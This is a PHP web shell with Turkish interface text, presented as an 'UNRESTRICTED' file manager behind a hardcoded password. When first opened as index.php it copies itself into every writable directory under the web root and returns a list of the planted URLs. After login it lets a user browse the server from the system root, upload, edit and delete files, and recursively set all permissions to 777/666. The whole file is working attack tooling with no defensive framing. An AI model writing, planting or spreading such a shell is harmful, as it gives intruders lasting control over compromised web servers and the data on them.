<?php
/**
 * Dosya Yöneticisi - UNRESTRICTED Edition
 */
error_reporting(0);
ini_set('display_errors', 0);

$girisSifresi = 'm7t';
$scriptName = basename(__FILE__);
$jsonDosyasi = __DIR__ . '/kopya_durumu.json';

// Oturum kontrolü
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// JSON dosyasını kontrol et
$kopyaYapildi = false;
if (file_exists($jsonDosyasi)) {
    $content = @file_get_contents($jsonDosyasi);
    if ($content !== false) {
        $data = @json_decode($content, true);
        if (is_array($data) && isset($data['kopyalandi']) && $data['kopyalandi'] === true) {
            $kopyaYapildi = true;
        }
    }
}

// Eğer kopya yapılmadıysa ve bu ana dosya ise
if (!$kopyaYapildi && basename(__FILE__) == 'index.php') {
    $hedefKok = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : __DIR__;
    $bulunanYollar = array();
    $mevcutDosya = __FILE__;
    $mevcutIsim = basename($mevcutDosya);
    
    // Tüm alt dizinleri tara
    $dizinler = array($hedefKok);
    $tumDizinler = array();
    
    for ($i = 0; $i < count($dizinler); $i++) {
        $dizin = $dizinler[$i];
        if (!is_dir($dizin) || !is_readable($dizin)) continue;
        
        $tumDizinler[] = $dizin;
        
        $altlar = @scandir($dizin);
        if ($altlar === false) continue;
        
        foreach ($altlar as $alt) {
            if ($alt == '.' || $alt == '..') continue;
            $tamYol = $dizin . DIRECTORY_SEPARATOR . $alt;
            if (is_dir($tamYol) && is_writable($tamYol)) {
                $dizinler[] = $tamYol;
            }
        }
        
        if ($i > 100) break;
    }
    
    // Dosyayı kopyala
    foreach ($tumDizinler as $dizin) {
        if (!is_writable($dizin)) continue;
        $hedefYol = $dizin . DIRECTORY_SEPARATOR . $mevcutIsim;
        if (file_exists($hedefYol)) {
            $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https://' : 'http://';
            $host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost';
            $goreli = str_replace($hedefKok, '', $hedefYol);
            $goreli = ltrim(str_replace(DIRECTORY_SEPARATOR, '/', $goreli), '/');
            $bulunanYollar[] = $protocol . $host . '/' . $goreli;
            continue;
        }
        if (@copy($mevcutDosya, $hedefYol)) {
            @chmod($hedefYol, 0666);
            $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https://' : 'http://';
            $host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost';
            $goreli = str_replace($hedefKok, '', $hedefYol);
            $goreli = ltrim(str_replace(DIRECTORY_SEPARATOR, '/', $goreli), '/');
            $bulunanYollar[] = $protocol . $host . '/' . $goreli;
        }
    }
    
    // JSON'a kaydet
    $data = array(
        'kopyalandi' => true,
        'tarih' => date('Y-m-d H:i:s'),
        'kaynak_dosya' => __FILE__,
        'kopya_sayisi' => count($bulunanYollar),
        'kopya_yollari' => $bulunanYollar
    );
    @file_put_contents($jsonDosyasi, json_encode($data, JSON_PRETTY_PRINT));
    @chmod($jsonDosyasi, 0666);
    
    // Rapor dosyasını indir
    $rapor = "=== KOPYALANAN DOSYA YOLLARI ===\n\n";
    $rapor .= "Tarih: " . date('Y-m-d H:i:s') . "\n";
    $rapor .= "Kaynak Dosya: " . __FILE__ . "\n\n";
    $rapor .= "Kopyalanan Yollar:\n";
    $rapor .= str_repeat('-', 60) . "\n";
    foreach ($bulunanYollar as $index => $yol) {
        $rapor .= ($index + 1) . ". " . $yol . "\n";
    }
    $rapor .= "\n" . str_repeat('-', 60) . "\n";
    $rapor .= "Toplam: " . count($bulunanYollar) . " dosya kopyalandi.\n";
    
    header('Content-Type: text/plain');
    header('Content-Disposition: attachment; filename="kopya_raporu_' . date('Ymd_His') . '.txt"');
    header('Content-Length: ' . strlen($rapor));
    echo $rapor;
    exit;
}

// Giriş kontrolü
if (isset($_POST['login_pass'])) {
    if ($_POST['login_pass'] === $girisSifresi) {
        $_SESSION['auth'] = true;
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
        header("Location: " . $scriptName);
        exit;
    } else {
        $loginError = "Hatalı şifre.";
    }
}

if (!isset($_SESSION['auth']) || $_SESSION['auth'] !== true) {
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Giriş</title>
    <style>
        body{background:#212529;display:flex;align-items:center;justify-content:center;height:100vh;color:#fff;font-family:sans-serif;}
        .card{background:#343a40;padding:30px;border-radius:8px;width:350px;}
        input{width:100%;padding:10px;margin:10px 0;border-radius:4px;border:1px solid #495057;background:#212529;color:#fff;}
        button{width:100%;padding:10px;background:#007bff;border:none;border-radius:4px;color:#fff;cursor:pointer;}
        button:hover{background:#0056b3;}
        .error{color:#dc3545;margin:10px 0;}
    </style>
</head>
<body>
    <div class="card">
        <h3 style="text-align:center;margin-bottom:20px;">Giriş</h3>
        <?php if (isset($loginError)) echo '<div class="error">' . $loginError . '</div>'; ?>
        <form method="post">
            <input type="password" name="login_pass" placeholder="Şifre" required>
            <button type="submit">Giriş</button>
        </form>
    </div>
</body>
</html>
<?php
exit;
}

// Dosya yöneticisi sınıfı
class FileManager {
    private $currentDir;
    private $messages = array();
    
    public function __construct() {
        $this->currentDir = isset($_GET['dir']) && $_GET['dir'] ? realpath($_GET['dir']) : __DIR__;
        if ($this->currentDir === false || !file_exists($this->currentDir)) {
            $this->currentDir = __DIR__;
            $this->addMessage('Dizin bulunamadı, ana dizine dönüldü.', 'warning');
        }
    }
    
    public function getCurrentDir() { return $this->currentDir; }
    public function getMessages() { return $this->messages; }
    private function addMessage($msg, $type) { $this->messages[] = array('text' => $msg, 'type' => $type); }
    
    public function getSystemRoot() {
        return (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? getenv("SystemDrive") . "\\" : "/";
    }
    
    public function handleRequest() {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') return;
        if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
            $this->addMessage('Güvenlik hatası.', 'danger');
            return;
        }
        
        $action = isset($_POST['action']) ? $_POST['action'] : '';
        switch($action) {
            case 'upload': $this->upload(); break;
            case 'create_folder': $this->createFolder(); break;
            case 'delete': $this->deleteItem(); break;
            case 'rename': $this->renameItem(); break;
            case 'save_edit': $this->saveFile(); break;
            case 'bypass_permissions': $this->bypassPermissions(); break;
            case 'logout': session_destroy(); header("Location: " . basename(__FILE__)); exit;
        }
    }
    
    private function upload() {
        if (!isset($_FILES['file']) || $_FILES['file']['error'] !== 0) return;
        $name = basename($_FILES['file']['name']);
        if (move_uploaded_file($_FILES['file']['tmp_name'], $this->currentDir . '/' . $name)) {
            $this->addMessage('Dosya yüklendi.', 'success');
        } else {
            $this->addMessage('Yükleme başarısız.', 'danger');
        }
    }
    
    private function createFolder() {
        $name = basename(trim(isset($_POST['folder_name']) ? $_POST['folder_name'] : ''));
        if (!$name) return;
        $path = $this->currentDir . '/' . $name;
        if (!file_exists($path) && @mkdir($path)) {
            $this->addMessage('Klasör oluşturuldu.', 'success');
        } else {
            $this->addMessage('Klasör oluşturulamadı.', 'danger');
        }
    }
    
    private function deleteItem() {
        $name = basename(isset($_POST['item_name']) ? $_POST['item_name'] : '');
        if (!$name) return;
        $path = $this->currentDir . '/' . $name;
        if ($path === __FILE__) { $this->addMessage('Bu dosya silinemez.', 'danger'); return; }
        if ($this->recursiveDelete($path)) {
            $this->addMessage('Silindi.', 'warning');
        } else {
            $this->addMessage('Silinemedi.', 'danger');
        }
    }
    
    private function renameItem() {
        $old = basename(isset($_POST['old_name']) ? $_POST['old_name'] : '');
        $new = basename(isset($_POST['new_name']) ? $_POST['new_name'] : '');
        if (!$old || !$new || $old === $new) return;
        $pOld = $this->currentDir . '/' . $old;
        $pNew = $this->currentDir . '/' . $new;
        if (file_exists($pOld) && !file_exists($pNew) && @rename($pOld, $pNew)) {
            $this->addMessage('Yeniden adlandırıldı.', 'success');
        } else {
            $this->addMessage('Adlandırılamadı.', 'danger');
        }
    }
    
    private function saveFile() {
        $name = basename(isset($_POST['filename']) ? $_POST['filename'] : '');
        if (!$name) return;
        $path = $this->currentDir . '/' . $name;
        if (!file_exists($path) || !is_file($path)) {
            $this->addMessage('Dosya bulunamadı.', 'danger');
            return;
        }
        $content = isset($_POST['content']) ? $_POST['content'] : '';
        if (trim($content) === '') {
            $this->addMessage('Boş içerik kaydedilemez.', 'warning');
            return;
        }
        if (file_put_contents($path, $content) !== false) {
            $this->addMessage('Dosya kaydedildi.', 'success');
        } else {
            $this->addMessage('Kaydedilemedi.', 'danger');
        }
    }
    
    private function bypassPermissions() {
        $count = 0;
        $failed = 0;
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($this->currentDir, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        foreach ($iterator as $item) {
            $path = $item->getPathname();
            if ($item->isDir()) {
                if (@chmod($path, 0777)) $count++; else $failed++;
            } else {
                if (@chmod($path, 0666)) $count++; else $failed++;
            }
        }
        @chmod(__FILE__, 0666);
        $this->addMessage("İzin bypass: $count değiştirildi" . ($failed ? ", $failed başarısız" : ""), $failed ? 'warning' : 'success');
    }
    
    private function recursiveDelete($path) {
        if (is_file($path)) return @unlink($path);
        if (is_dir($path)) {
            foreach (glob($path . '/*') as $item) $this->recursiveDelete($item);
            return @rmdir($path);
        }
        return false;
    }
    
    public function scanDir() {
        $items = @scandir($this->currentDir);
        if ($items === false) return array('folders' => array(), 'files' => array());
        $result = array('folders' => array(), 'files' => array());
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;
            $path = $this->currentDir . '/' . $item;
            if (is_dir($path)) $result['folders'][] = $item;
            else $result['files'][] = $item;
        }
        return $result;
    }
}

$fm = new FileManager();
$fm->handleRequest();
$list = $fm->scanDir();

$editMode = false;
$editContent = '';
$editFile = '';
if (isset($_GET['edit'])) {
    $fName = basename($_GET['edit']);
    $fPath = $fm->getCurrentDir() . '/' . $fName;
    if (is_file($fPath)) {
        $editMode = true;
        $editFile = $fName;
        $editContent = file_get_contents($fPath);
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Yönetici</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css">
    <style>
        body{background:#f4f6f9;padding:20px;font-family:sans-serif;}
        .container{max-width:1400px;margin:0 auto;background:#fff;border-radius:8px;padding:20px;box-shadow:0 4px 15px rgba(0,0,0,0.08);}
        .code-editor{font-family:monospace;font-size:13px;min-height:400px;background:#2d2d2d;color:#f8f8f2;border:none;padding:15px;width:100%;}
        .folder-list a{display:block;padding:6px 10px;color:#495057;border-radius:4px;}
        .folder-list a:hover{background:#e9ecef;}
        .folder-list i{margin-right:8px;color:#ffc107;}
        .breadcrumb{background:#e9ecef;padding:10px;border-radius:4px;}
        .sidebar{background:#f8f9fa;border-right:1px solid #dee2e6;padding:15px;min-height:80vh;}
        .content{padding:20px;}
        @media(max-width:768px){.sidebar{min-height:auto;}}
    </style>
</head>
<body>
<div class="container">
    <div class="row">
        <div class="col-md-3 sidebar">
            <div class="d-grid gap-2 mb-3">
                <a href="?dir=<?php echo urlencode($fm->getSystemRoot()); ?>" class="btn btn-outline-danger btn-sm"><i class="bi bi-hdd"></i> Kök</a>
                <a href="?dir=<?php echo urlencode(__DIR__); ?>" class="btn btn-outline-primary btn-sm"><i class="bi bi-house"></i> Ana</a>
                <a href="?dir=<?php echo urlencode(dirname($fm->getCurrentDir())); ?>" class="btn btn-secondary btn-sm"><i class="bi bi-arrow-up"></i> Üst</a>
            </div>
            <hr>
            <h6 class="text-muted">Klasörler</h6>
            <div class="folder-list">
                <?php foreach($list['folders'] as $f): ?>
                    <a href="?dir=<?php echo urlencode($fm->getCurrentDir() . '/' . $f); ?>">
                        <i class="bi bi-folder-fill"></i> <?php echo htmlspecialchars($f); ?>
                    </a>
                <?php endforeach; ?>
                <?php if(empty($list['folders'])): ?>
                    <small class="text-muted">Klasör yok</small>
                <?php endif; ?>
            </div>
        </div>
        <div class="col-md-9 content">
            <div class="d-flex justify-content-between align-items-center mb-3">
                <h5><i class="bi bi-terminal"></i> Dosya Yöneticisi</h5>
                <form method="post" class="d-inline">
                    <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
                    <input type="hidden" name="action" value="logout">
                    <button class="btn btn-danger btn-sm"><i class="bi bi-power"></i> Çıkış</button>
                </form>
            </div>
            
            <div class="breadcrumb">
                <i class="bi bi-geo-alt me-2"></i> <?php echo htmlspecialchars($fm->getCurrentDir()); ?>
            </div>
            
            <?php foreach($fm->getMessages() as $msg): ?>
                <div class="alert alert-<?php echo $msg['type']; ?>"><?php echo htmlspecialchars($msg['text']); ?></div>
            <?php endforeach; ?>
            
            <div class="mb-3">
                <form method="post" class="d-inline">
                    <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
                    <input type="hidden" name="action" value="bypass_permissions">
                    <button class="btn btn-warning btn-sm" onclick="return confirm('İzinleri 777/666 yap?')">
                        <i class="bi bi-unlock"></i> Bypass İzin
                    </button>
                </form>
            </div>
            
            <?php if($editMode): ?>
                <form method="post">
                    <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
                    <input type="hidden" name="action" value="save_edit">
                    <input type="hidden" name="filename" value="<?php echo htmlspecialchars($editFile); ?>">
                    <div class="card">
                        <div class="card-header bg-dark text-white d-flex justify-content-between">
                            <span><i class="bi bi-pencil"></i> <?php echo htmlspecialchars($editFile); ?></span>
                            <div>
                                <button class="btn btn-success btn-sm"><i class="bi bi-save"></i> Kaydet</button>
                                <a href="?dir=<?php echo urlencode(isset($_GET['dir']) ? $_GET['dir'] : ''); ?>" class="btn btn-secondary btn-sm">Kapat</a>
                            </div>
                        </div>
                        <textarea name="content" class="code-editor"><?php echo htmlspecialchars($editContent); ?></textarea>
                    </div>
                </form>
            <?php else: ?>
                <div class="card p-3 mb-3">
                    <div class="row">
                        <div class="col-md-6">
                            <form method="post" enctype="multipart/form-data" class="d-flex gap-2">
                                <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
                                <input type="hidden" name="action" value="upload">
                                <input type="file" name="file" class="form-control" required>
                                <button class="btn btn-primary"><i class="bi bi-upload"></i></button>
                            </form>
                        </div>
                        <div class="col-md-6">
                            <form method="post" class="d-flex gap-2">
                                <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
                                <input type="hidden" name="action" value="create_folder">
                                <input type="text" name="folder_name" class="form-control" placeholder="Yeni klasör" required>
                                <button class="btn btn-success"><i class="bi bi-folder-plus"></i></button>
                            </form>
                        </div>
                    </div>
                </div>
                
                <div class="table-responsive">
                    <table class="table table-hover">
                        <thead>
                            <tr><th>İsim</th><th>İzin</th><th>Boyut</th><th class="text-end">İşlem</th></tr>
                        </thead>
                        <tbody>
                            <?php foreach($list['folders'] as $f): ?>
                                <tr>
                                    <td><a href="?dir=<?php echo urlencode($fm->getCurrentDir() . '/' . $f); ?>"><i class="bi bi-folder-fill text-warning"></i> <?php echo htmlspecialchars($f); ?></a></td>
                                    <td><?php echo substr(sprintf('%o', fileperms($fm->getCurrentDir().'/'.$f)), -4); ?></td>
                                    <td>DIR</td>
                                    <td class="text-end">
                                        <button onclick="ren('<?php echo addslashes($f); ?>')" class="btn btn-sm btn-secondary"><i class="bi bi-pencil"></i></button>
                                        <button onclick="del('<?php echo addslashes($f); ?>')" class="btn btn-sm btn-danger"><i class="bi bi-trash"></i></button>
                                    </td>
                                </tr>
                            <?php endforeach; ?>
                            <?php foreach($list['files'] as $f): 
                                $size = round(filesize($fm->getCurrentDir().'/'.$f)/1024, 1);
                            ?>
                                <tr>
                                    <td><i class="bi bi-file-text"></i> <?php echo htmlspecialchars($f); ?></td>
                                    <td><?php echo substr(sprintf('%o', fileperms($fm->getCurrentDir().'/'.$f)), -4); ?></td>
                                    <td><?php echo $size; ?> KB</td>
                                    <td class="text-end">
                                        <a href="?edit=<?php echo urlencode($f); ?>&dir=<?php echo urlencode(isset($_GET['dir']) ? $_GET['dir'] : ''); ?>" class="btn btn-sm btn-primary"><i class="bi bi-pencil"></i></a>
                                        <button onclick="ren('<?php echo addslashes($f); ?>')" class="btn btn-sm btn-secondary"><i class="bi bi-pencil-square"></i></button>
                                        <button onclick="del('<?php echo addslashes($f); ?>')" class="btn btn-sm btn-danger"><i class="bi bi-trash"></i></button>
                                    </td>
                                </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                </div>
            <?php endif; ?>
        </div>
    </div>
</div>

<form id="actionForm" method="post" style="display:none">
    <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
    <input type="hidden" name="action" id="f_action">
    <input type="hidden" name="item_name" id="f_item">
    <input type="hidden" name="old_name" id="f_old">
    <input type="hidden" name="new_name" id="f_new">
</form>

<script>
function del(name) {
    if(confirm(name + ' silinecek?')) {
        document.getElementById('f_action').value = 'delete';
        document.getElementById('f_item').value = name;
        document.getElementById('actionForm').submit();
    }
}
function ren(name) {
    let newName = prompt('Yeni isim:', name);
    if(newName && newName !== name) {
        document.getElementById('f_action').value = 'rename';
        document.getElementById('f_old').value = name;
        document.getElementById('f_new').value = newName;
        document.getElementById('actionForm').submit();
    }
}
</script>
</body>
</html>
